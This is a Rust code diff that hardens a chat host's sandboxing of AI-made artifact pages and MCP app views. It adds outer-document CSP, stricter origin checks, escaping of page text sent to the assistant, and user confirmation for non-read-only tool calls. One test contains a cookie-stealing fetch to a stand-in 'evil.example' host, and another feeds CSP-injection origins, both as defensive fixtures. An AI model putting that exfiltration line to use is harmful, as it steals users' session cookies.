@@ -24,7 +24,7 @@ use serde::{Deserialize, Serialize};
 use serde_json::{Map, Value, json};
 use uuid::Uuid;
 
-use crate::hook::{self, Call, Judgement, Risk};
+use crate::hook::{self, Call, Risk};
 use crate::state::App;
 use crate::subnet::BrowserEvent;
 
@@ -96,11 +96,19 @@ fn esc(s: &str) -> String {
 /// form posts or base changes.
 const ARTIFACT_CSP: &str = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'";
 
-/// An origin a view may declare: https/wss, host (wildcard subdomain
-/// allowed), optional port, nothing that could end the CSP directive.
+/// An origin a view may declare: https/wss, a host with at least one dot
+/// (a wildcard only as its first label, `*.example.com`), an optional port,
+/// nothing that could end the CSP directive.
 fn origin_ok(o: &str) -> bool {
-    let rest = o.strip_prefix("https://").or_else(|| o.strip_prefix("wss://"));
-    rest.is_some_and(|r| !r.is_empty() && r.len() < 200 && r.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '*' | ':')))
+    let Some(rest) = o.strip_prefix("https://").or_else(|| o.strip_prefix("wss://")) else { return false };
+    let host = rest.split(':').next().unwrap_or_default();
+    let port_ok = rest[host.len()..].strip_prefix(':').is_none_or(|p| !p.is_empty() && p.len() <= 5 && p.chars().all(|c| c.is_ascii_digit()));
+    let labels: Vec<&str> = host.split('.').collect();
+    labels.len() >= if labels[0] == "*" { 3 } else { 2 }
+        && labels.iter().enumerate().all(|(i, l)| (i == 0 && *l == "*") || (!l.is_empty() && l.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')))
+        && labels.iter().skip(1).any(|l| l.chars().any(|c| c.is_ascii_alphabetic()))
+        && port_ok
+        && rest.len() < 200
 }
 
 /// An MCP Apps view's CSP: the spec's restrictive default plus the origins
@@ -123,6 +131,24 @@ fn csp_meta(policy: &str) -> String {
     format!(r#"<meta http-equiv="Content-Security-Policy" content="{}">"#, esc(policy))
 }
 
+/// The page inside a trusted outer document (the MCP Apps sandbox proxy):
+/// the outer one carries the CSP, ahead of anything the page could put
+/// before it, and the page's nested `srcdoc` frame inherits it. The policy
+/// also governs where that frame may navigate (`frame-src`): nowhere. The
+/// outer document only relays JSON-RPC between the page and the chat.
+pub fn sandboxed(page: &str, policy: &str, title: &str) -> String {
+    format!(
+        "<!doctype html><html><head><meta charset=\"utf-8\">{}<meta http-equiv=\"x-dns-prefetch-control\" content=\"off\"><title>{}</title>\
+<style>html,body{{margin:0;height:100%;overflow:hidden;background:transparent}}iframe{{display:block;border:0;width:100%;height:100%}}</style></head>\
+<body><iframe sandbox=\"allow-scripts\" title=\"{}\" srcdoc=\"{}\"></iframe>\
+<script>(()=>{{const f=document.querySelector('iframe');addEventListener('message',(e)=>{{if(e.source===f.contentWindow)parent.postMessage(e.data,'*');else if(e.source===parent)f.contentWindow.postMessage(e.data,'*');}});}})()</script></body></html>",
+        csp_meta(policy),
+        esc(title),
+        esc(title),
+        esc(page),
+    )
+}
+
 /// An artifact's page: the suite (styles, components, the bridge) around
 /// the assistant's HTML, a fragment or a whole document.
 pub fn artifact_document(html: &str, title: &str, surface: &str, version: i32, theme: Option<&str>) -> String {
@@ -132,21 +158,22 @@ pub fn artifact_document(html: &str, title: &str, surface: &str, version: i32, t
         _ => "",
     };
     let head = format!(
-        "<meta charset=\"utf-8\">{}<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><meta name=\"gui-transport\" content=\"postmessage\"><meta name=\"surface\" content=\"{}\"><meta name=\"version\" content=\"{version}\"><style>{SUITE_CSS}</style>{scheme}<script type=\"module\">{}</script>",
-        csp_meta(ARTIFACT_CSP),
+        "<meta charset=\"utf-8\"><meta http-equiv=\"x-dns-prefetch-control\" content=\"off\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><meta name=\"gui-transport\" content=\"postmessage\"><meta name=\"surface\" content=\"{}\"><meta name=\"version\" content=\"{version}\"><style>{SUITE_CSS}</style>{scheme}<script type=\"module\">{}</script>",
         esc(surface),
         *SUITE_MODULE,
     );
-    if is_document(html) {
+    // Where the suite goes doesn't matter for safety: the CSP comes from the outer document.
+    let page = if is_document(html) {
         into_head(html, &head)
     } else {
         format!("<!doctype html><html><head>{head}<title>{}</title></head><body><main class=\"gui-surface\">{html}</main></body></html>", esc(title))
-    }
+    };
+    sandboxed(&page, ARTIFACT_CSP, title)
 }
 
 /// A view's page: its own HTML under its CSP.
-pub fn view_document(html: &str, ui: &Value) -> String {
-    into_head(html, &format!("<meta charset=\"utf-8\">{}", csp_meta(&view_csp(ui))))
+pub fn view_document(html: &str, ui: &Value, title: &str) -> String {
+    sandboxed(html, &view_csp(ui), title)
 }
 
 // ─── Storage ────────────────────────────────────────────────────────────────
@@ -505,7 +532,9 @@ pub async fn take_model_context(app: &App, conversation: Uuid) -> Result<Option<
     if rows.is_empty() {
         return Ok(None);
     }
-    Ok(Some(rows.into_iter().map(|(title, ctx)| format!("The page \"{title}\" reports: {}", truncate(&ctx.to_string(), 4000))).collect::<Vec<_>>().join("\n")))
+    // JSON-encoded, so no tag can close the context block early.
+    let line = |title: &str, ctx: &Value| format!("The page \"{}\" reports: {}", label(title), truncate(&ctx.to_string(), 4000).replace('<', "\\u003c"));
+    Ok(Some(rows.iter().map(|(title, ctx)| line(title, ctx)).collect::<Vec<_>>().join("\n")))
 }
 
 // ─── The browser's side ─────────────────────────────────────────────────────
@@ -530,7 +559,7 @@ pub async fn document(app: &App, user: Uuid, id: Uuid, q: DocQuery) -> Result<Va
         .ok_or_else(|| ApiError::not_found(format!("no version {version}")))?;
     let doc = match a.kind.as_str() {
         "artifact" => artifact_document(&html, &a.title, &format!("chat/{}/{}", a.conversation_id, a.name.as_deref().unwrap_or("page")), version, q.theme.as_deref()),
-        _ => view_document(&html, &meta["ui"]),
+        _ => view_document(&html, &meta["ui"], &a.title),
     };
     Ok(json!({
         "id": id, "kind": a.kind, "title": a.title, "name": a.name, "service": a.service,
@@ -554,10 +583,56 @@ pub struct BackflowInput {
     pub version: Option<String>,
     #[serde(default = "en")]
     pub lang: String,
+    /// The user just acted in the page (the host saw a user activation).
+    #[serde(default)]
+    pub gesture: bool,
 }
 
 fn en() -> String {
     "en".into()
+}
+
+/// Handler runs on the server at once, and the users with one running: a
+/// run holds a blocking thread and a database connection for up to seconds.
+static HANDLER_SLOTS: LazyLock<tokio::sync::Semaphore> = LazyLock::new(|| tokio::sync::Semaphore::new(4));
+static RUNNING_FOR: LazyLock<Mutex<std::collections::HashSet<Uuid>>> = LazyLock::new(Default::default);
+
+/// A user's turn to run a handler (one at a time each); released on drop.
+struct UserRun(Uuid);
+impl UserRun {
+    fn start(user: Uuid) -> Option<Self> {
+        RUNNING_FOR.lock().expect("running handlers").insert(user).then_some(Self(user))
+    }
+}
+impl Drop for UserRun {
+    fn drop(&mut self) {
+        RUNNING_FOR.lock().expect("running handlers").remove(&self.0);
+    }
+}
+
+/// When each page last spoke for the user (ui/message, an action without a handler).
+static LAST_SAID: LazyLock<Mutex<HashMap<Uuid, std::time::Instant>>> = LazyLock::new(Default::default);
+const SAY_EVERY: std::time::Duration = std::time::Duration::from_secs(3);
+
+/// A page may speak for the user right after they acted, and not in a burst.
+fn may_speak(page: Uuid, gesture: bool) -> Result<(), ApiError> {
+    if !gesture {
+        return Err(ApiError::forbidden("a page sends messages only when the user acts on it"));
+    }
+    let mut last = LAST_SAID.lock().expect("pages' messages");
+    if last.len() > 10_000 {
+        last.clear();
+    }
+    if last.get(&page).is_some_and(|t| t.elapsed() < SAY_EVERY) {
+        return Err(ApiError::conflict("the page just sent a message; wait a moment"));
+    }
+    last.insert(page, std::time::Instant::now());
+    Ok(())
+}
+
+/// A page's title inside text for the assistant: no markup, one line.
+fn label(title: &str) -> String {
+    title.chars().filter(|c| !matches!(c, '<' | '>' | '"' | '\n' | '\r')).collect()
 }
 
 /// What a handler returned and the KV views it left.
@@ -631,14 +706,20 @@ pub async fn backflow(app: &App, user: Uuid, id: Uuid, i: BackflowInput) -> Resu
 
     let Some(handler) = handler else {
         // No handler: it's for the assistant, as the user's message.
+        may_speak(id, i.gesture)?;
         record("user", i.action.clone(), i.value.clone(), true).execute(&app.pool).await.map_err(internal)?;
         let value = if i.value.is_null() { String::new() } else { format!(": {}", truncate(&i.value.to_string(), 1500)) };
-        let text = format!("[On the page \"{}\"] {}{value}", a.title, i.action);
+        let text = format!("[The user acted on the page \"{}\"] {}{value}", label(&a.title), i.action);
         crate::chat::send(app, user, Some(a.conversation_id), &text, &i.lang).await?;
         return Ok(json!({ "response": null, "sent": true }));
     };
 
-    // One run at a time per page: the handler reads and writes its KV.
+    // One run at a time per user, a few at a time in all; per page the
+    // row lock below serialises the handler's read and write of its KV.
+    let Some(_turn) = UserRun::start(user) else {
+        return Err(ApiError::conflict("a page's handler is still running; try again in a moment"));
+    };
+    let _slot = HANDLER_SLOTS.acquire().await.map_err(internal)?;
     let mut tx = app.pool.begin().await.map_err(internal)?;
     sqlx::query("INSERT INTO artifact_state (artifact_id) VALUES ($1) ON CONFLICT DO NOTHING").bind(id).execute(&mut *tx).await.map_err(internal)?;
     let (kv, kv_private): (Value, Value) = sqlx::query_as("SELECT kv, kv_private FROM artifact_state WHERE artifact_id = $1 FOR UPDATE").bind(id).fetch_one(&mut *tx).await.map_err(internal)?;
@@ -689,12 +770,17 @@ pub struct MessageInput {
     pub text: String,
     #[serde(default = "en")]
     pub lang: String,
+    #[serde(default)]
+    pub gesture: bool,
 }
 
-/// The page sends the user's message (ui/message).
+/// The page sends a message for the user (ui/message), right after they
+/// acted on it; the assistant sees where it comes from.
 pub async fn message(app: &App, user: Uuid, id: Uuid, i: MessageInput) -> Result<Value, ApiError> {
     let a = owned(app, user, id).await?;
-    crate::chat::send(app, user, Some(a.conversation_id), &i.text, &i.lang).await?;
+    may_speak(id, i.gesture)?;
+    let text = format!("[Sent by the page \"{}\" as the user acted on it] {}", label(&a.title), i.text.trim());
+    crate::chat::send(app, user, Some(a.conversation_id), &text, &i.lang).await?;
     Ok(json!({}))
 }
 
@@ -744,14 +830,15 @@ fn ask_token(page: Uuid, call: &Call) -> String {
 // ponytail: in memory, last 20 per page, forgotten on restart; persist if pages run long sessions.
 static PAGE_CALLS: LazyLock<Mutex<HashMap<Uuid, Vec<Call>>>> = LazyLock::new(Default::default);
 
-fn risk_of_tool(tool: Option<&rmcp::model::Tool>, name: &str) -> Risk {
-    match tool.and_then(|t| t.annotations.as_ref()) {
-        Some(a) if a.read_only_hint == Some(true) => Risk::ReadOnly,
-        Some(a) if a.destructive_hint == Some(true) => Risk::Destructive,
-        Some(a) if a.destructive_hint == Some(false) => Risk::Mutating,
-        _ => hook::risk_of(name),
-    }
+/// What a page may do without asking: only what the service itself lists
+/// as read-only (MCP's default for a tool without hints is destructive).
+fn reads_only(tool: &rmcp::model::Tool) -> bool {
+    tool.annotations.as_ref().is_some_and(|a| a.read_only_hint == Some(true))
 }
+
+/// The most of a call's arguments a page may send: all of it is shown when
+/// the user is asked.
+const MAX_PAGE_ARGS: usize = 8 * 1024;
 
 fn tool_error(why: impl Into<String>) -> Value {
     json!({ "content": [{ "type": "text", "text": why.into() }], "isError": true })
@@ -800,8 +887,20 @@ pub async fn call(app: &App, user: Uuid, id: Uuid, i: CallInput) -> Result<Value
         audit(app, user, &client, &call.name, "deny", "purchases aren't made from pages").await;
         return Ok(tool_error("This would buy something; purchases aren't made from pages. Ask the assistant in the chat instead."));
     }
-    let listed = connector.tool(&tenant, &service, &tool).await.ok().flatten();
-    let risk = risk_of_tool(listed.as_ref(), &call.name);
+    // Only tools the service lists (for an artifact: the ones a model may
+    // call; for a view: the ones views may call, checked again in the call).
+    let listed = match connector.tool(&tenant, &service, &tool).await {
+        Ok(Some(t)) => t,
+        Ok(None) => return Ok(tool_error(format!("{service} has no tool {tool}"))),
+        Err(e) => return Ok(tool_error(format!("listing {service}'s tools failed: {e}"))),
+    };
+    if !from_view && !plan_ai_connector::views::visibility(&listed).0 {
+        return Ok(tool_error(format!("{tool} is only for {service}'s own view")));
+    }
+    if call.args.to_string().len() > MAX_PAGE_ARGS {
+        audit(app, user, &client, &call.name, "deny", "arguments too long to show").await;
+        return Ok(tool_error(format!("A page's call may carry at most {} KiB of arguments.", MAX_PAGE_ARGS / 1024)));
+    }
     let mut history = PAGE_CALLS.lock().expect("page calls").get(&id).cloned().unwrap_or_default();
     if history.is_empty() && from_view {
         // A view exists because of its tool's call: that's what it read first.
@@ -810,33 +909,22 @@ pub async fn call(app: &App, user: Uuid, id: Uuid, i: CallInput) -> Result<Value
             history.push(Call { name: format!("{service}.{}", m["tool"].as_str().unwrap_or_default()), args: m["arguments"].clone() });
         }
     }
-    let reason = format!(
-        "The user is using the interactive page \"{}\" in the chat (it only runs while they have it open) and acted on it; the page makes this call for them.",
-        a.title
-    );
-    // A page refreshing its data repeats reads by design: the duplicate and
-    // loop rules are for the assistant's own reasoning, not for pages. A call
-    // the user just allowed (its token) isn't judged again.
-    let judged = if i.confirmed.as_deref().is_some_and(|t| take_confirmation(t, id, &call)) {
-        Judgement::Allow("confirmed by the user".into())
+    // Reads go through (a page refreshing its data repeats them by design).
+    // Anything else waits for the user: a page can't show that they asked
+    // for it (it may run on its own), so they always see the whole call. A
+    // call they just allowed carries that answer's token.
+    let risk = if reads_only(&listed) { Risk::ReadOnly } else if listed.annotations.as_ref().is_some_and(|a| a.destructive_hint == Some(false)) { Risk::Mutating } else { Risk::Destructive };
+    let verdict = if i.confirmed.as_deref().is_some_and(|t| take_confirmation(t, id, &call)) {
+        Ok("confirmed by the user".to_string())
     } else if risk == Risk::ReadOnly {
-        Judgement::Allow("read-only".into())
+        Ok("read-only".to_string())
+    } else if let Some(why) = hook::static_check(&call, risk, &history) {
+        Err(why)
     } else {
-        hook::judge_present(app, &call, risk, &history, &reason).await
-    };
-    let verdict = match judged {
-        Judgement::Allow(why) => Ok(why),
-        Judgement::Deny(why) => Err(why),
-        // The user is right there, acting on the page: they hear the
-        // objection and decide (the assistant's own calls are denied instead).
-        Judgement::Rejected(why) => {
-            let message = format!("The page \"{}\" wants to run {} with {}.\nThe safety check objects: {why}", a.title, call.name, truncate(&call.args.to_string(), 600));
-            return Ok(json!({ "confirm": { "message": message, "tool": call.name, "token": ask_token(id, &call) } }));
-        }
-        Judgement::Ask(why) => {
-            let message = format!("The page \"{}\" wants to run {} with {}.\n{why}", a.title, call.name, truncate(&call.args.to_string(), 600));
-            return Ok(json!({ "confirm": { "message": message, "tool": call.name, "token": ask_token(id, &call) } }));
-        }
+        let what = listed.description.as_deref().map(|d| format!(" ({})", truncate(d, 200))).unwrap_or_default();
+        let args = serde_json::to_string_pretty(&call.args).unwrap_or_else(|_| call.args.to_string());
+        let message = format!("The page \"{}\" wants to run {}{what} with:\n{args}", label(&a.title), call.name);
+        return Ok(json!({ "confirm": { "message": message, "tool": call.name, "token": ask_token(id, &call) } }));
     };
     match verdict {
         Ok(why) => {
@@ -911,6 +999,13 @@ impl plan_ai_connector::ViewSink for ChatViews {
             d.remove("icons");
         }
         let meta = json!({ "tool": v.tool.name, "definition": definition, "arguments": v.arguments, "result": v.result, "ui": ui });
+        if meta.to_string().len() > 2 * MAX_HTML {
+            return Err("the call's result is over 1 MiB; no view".into());
+        }
+        let count: i64 = sqlx::query_scalar("SELECT count(*) FROM artifacts WHERE conversation_id = $1").bind(conversation).fetch_one(&self.0).await.map_err(|e| e.to_string())?;
+        if count >= 2 * MAX_ARTIFACTS {
+            return Err("the conversation has too many pages".into());
+        }
         let id = Uuid::new_v4();
         let mut tx = self.0.begin().await.map_err(|e| e.to_string())?;
         sqlx::query("INSERT INTO artifacts (id, user_id, conversation_id, kind, title, service) VALUES ($1, $2, $3, 'mcp_app', $4, $5)")
@@ -935,15 +1030,17 @@ impl plan_ai_connector::ViewSink for ChatViews {
 }
 
 /// The page a finished tool call made, for its message in the chat: an
-/// artifact the assistant published, or a service tool's view.
-pub async fn of_tool_result(pool: &sqlx::PgPool, tool: &str, content: &str) -> Option<Value> {
+/// artifact the assistant published, or a service tool's view (of this
+/// conversation only: a service's result could name any id).
+pub async fn of_tool_result(pool: &sqlx::PgPool, conversation: Uuid, tool: &str, content: &str) -> Option<Value> {
     let id: Uuid = match tool {
         "chat.artifact_publish" => serde_json::from_str::<Value>(content).ok()?["artifact"].as_str()?.parse().ok()?,
         "connector.call_tool" => plan_ai_connector::views::view_id_in(content)?.parse().ok()?,
         _ => return None,
     };
-    let row: (String, String, Option<i32>) = sqlx::query_as("SELECT a.kind, a.title, (SELECT max(version) FROM artifact_versions v WHERE v.artifact_id = a.id) FROM artifacts a WHERE a.id = $1")
+    let row: (String, String, Option<i32>) = sqlx::query_as("SELECT a.kind, a.title, (SELECT max(version) FROM artifact_versions v WHERE v.artifact_id = a.id) FROM artifacts a WHERE a.id = $1 AND a.conversation_id = $2")
         .bind(id)
+        .bind(conversation)
         .fetch_optional(pool)
         .await
         .ok()??;
@@ -1020,41 +1117,65 @@ mod tests {
         assert!(!m.contains("</script"), "the module can sit in a <script>");
     }
 
-    #[test]
-    fn a_fragment_gets_the_suite_and_the_csp_first() {
-        let doc = artifact_document("<ui-heading>Hi</ui-heading>", "T <x>", "chat/c/p", 3, Some("light"));
-        let head = &doc[..doc.find("</head>").unwrap()];
-        assert!(head.starts_with("<!doctype html><html><head><meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\""));
-        assert!(head.contains("connect-src 'none'") && head.contains("<meta name=\"gui-transport\" content=\"postmessage\">"));
-        assert!(head.contains("<meta name=\"version\" content=\"3\">") && head.contains(":root{color-scheme:light}"));
-        assert!(doc.contains("<title>T &lt;x&gt;</title>") && doc.contains("<main class=\"gui-surface\"><ui-heading>Hi</ui-heading></main>"));
+    /// The page inside its trusted outer document: (outer head, the page).
+    fn split(doc: &str) -> (String, String) {
+        let head = doc[..doc.find("</head>").unwrap()].to_string();
+        let start = doc.find("srcdoc=\"").unwrap() + 8;
+        let end = start + doc[start..].find('"').unwrap();
+        let page = doc[start..end].replace("&quot;", "\"").replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&");
+        (head, page)
     }
 
     #[test]
-    fn a_document_gets_them_at_the_top_of_its_head() {
-        let doc = artifact_document("<!DOCTYPE html><HTML><HEAD lang=x><script>a()</script></HEAD><body>b</body></HTML>", "t", "s", 1, None);
-        let csp = doc.find("Content-Security-Policy").unwrap();
-        assert!(csp < doc.find("<script>a()").unwrap(), "the CSP governs the page's own scripts");
+    fn the_csp_sits_in_a_trusted_outer_document_the_page_cant_touch() {
+        // The page tries to get ahead of an injected CSP: a "<head" in a comment, a script first.
+        let evil = "<!--<head>--><script>fetch('https://evil.example/'+document.cookie)</script><head></head>";
+        let doc = artifact_document(evil, "T", "chat/c/p", 1, None);
+        assert!(doc.starts_with("<!doctype html><html><head><meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\""), "{}", &doc[..200]);
+        let (head, page) = split(&doc);
+        assert!(head.contains("connect-src 'none'") && head.contains("frame-src 'none'"));
+        assert!(!head.contains("evil.example"), "the page's markup stays out of the outer document");
+        assert!(page.contains("fetch('https://evil.example/'"), "the page is the nested frame's document");
+        assert!(doc.contains("<iframe sandbox=\"allow-scripts\""));
+        assert_eq!(doc.matches("<script>").count(), 1, "only the relay runs in the outer document");
+        // A view: the same, with its own (declared) policy.
+        let view = view_document("<p onclick=x>v</p>", &json!({ "csp": { "connectDomains": ["https://api.example.com"] } }), "svc · tool");
+        let (head, page) = split(&view);
+        assert!(head.contains("connect-src https://api.example.com;") && page == "<p onclick=x>v</p>");
+    }
+
+    #[test]
+    fn a_fragment_gets_the_suite() {
+        let (_, page) = split(&artifact_document("<ui-heading>Hi</ui-heading>", "T <x>", "chat/c/p", 3, Some("light")));
+        assert!(page.starts_with("<!doctype html><html><head><meta charset=\"utf-8\">"));
+        assert!(page.contains("<meta name=\"gui-transport\" content=\"postmessage\">") && page.contains("<meta name=\"version\" content=\"3\">"));
+        assert!(page.contains(":root{color-scheme:light}") && page.contains("<title>T &lt;x&gt;</title>"));
+        assert!(page.contains("<main class=\"gui-surface\"><ui-heading>Hi</ui-heading></main>"));
+        let (_, doc) = split(&artifact_document("<!DOCTYPE html><HTML><HEAD lang=x></HEAD><body>b</body></HTML>", "t", "s", 1, None));
         assert!(doc.starts_with("<!DOCTYPE html><HTML><HEAD lang=x><meta charset"));
-        let bare = view_document("<p>x</p>", &Value::Null);
-        assert!(bare.starts_with("<head><meta charset=\"utf-8\"><meta http-equiv"));
-        let html_only = into_head("<html lang=en><body>x</body></html>", "<i>");
-        assert_eq!(html_only, "<html lang=en><head><i></head><body>x</body></html>");
+        assert_eq!(into_head("<html lang=en><body>x</body></html>", "<i>"), "<html lang=en><head><i></head><body>x</body></html>");
     }
 
     #[test]
     fn view_csp_takes_only_wellformed_origins() {
         let ui = json!({ "csp": {
-            "connectDomains": ["https://api.example.com", "http://plain.example", "https://x; script-src *"],
+            "connectDomains": ["https://api.example.com", "http://plain.example", "https://x; script-src *", "https://*", "https://*.com", "https://localhost"],
             "resourceDomains": ["https://*.cdn.example:8443"],
         } });
         let csp = view_csp(&ui);
         assert!(csp.contains("connect-src https://api.example.com;"), "{csp}");
-        assert!(!csp.contains("plain.example") && !csp.contains("script-src *"), "{csp}");
+        assert!(!csp.contains("plain.example") && !csp.contains("script-src *") && !csp.contains("https://* ") && !csp.contains("localhost"), "{csp}");
         assert!(csp.contains("script-src 'self' 'unsafe-inline' https://*.cdn.example:8443;"), "{csp}");
         assert!(csp.contains("frame-src 'none'") && csp.contains("object-src 'none'"));
         let default = view_csp(&Value::Null);
         assert!(default.contains("connect-src 'none'") && default.contains("base-uri 'self'"));
+        assert!(!origin_ok("https://*.com") && origin_ok("https://*.example.com"));
+        assert!(origin_ok("wss://rt.example.com:443") && !origin_ok("https://a.example.com:99999x"));
+    }
+
+    #[test]
+    fn page_text_for_the_assistant_has_no_markup() {
+        assert_eq!(label("A <b>\"x\"</b>\nnext"), "A bx/bnext");
     }
 
     #[test]
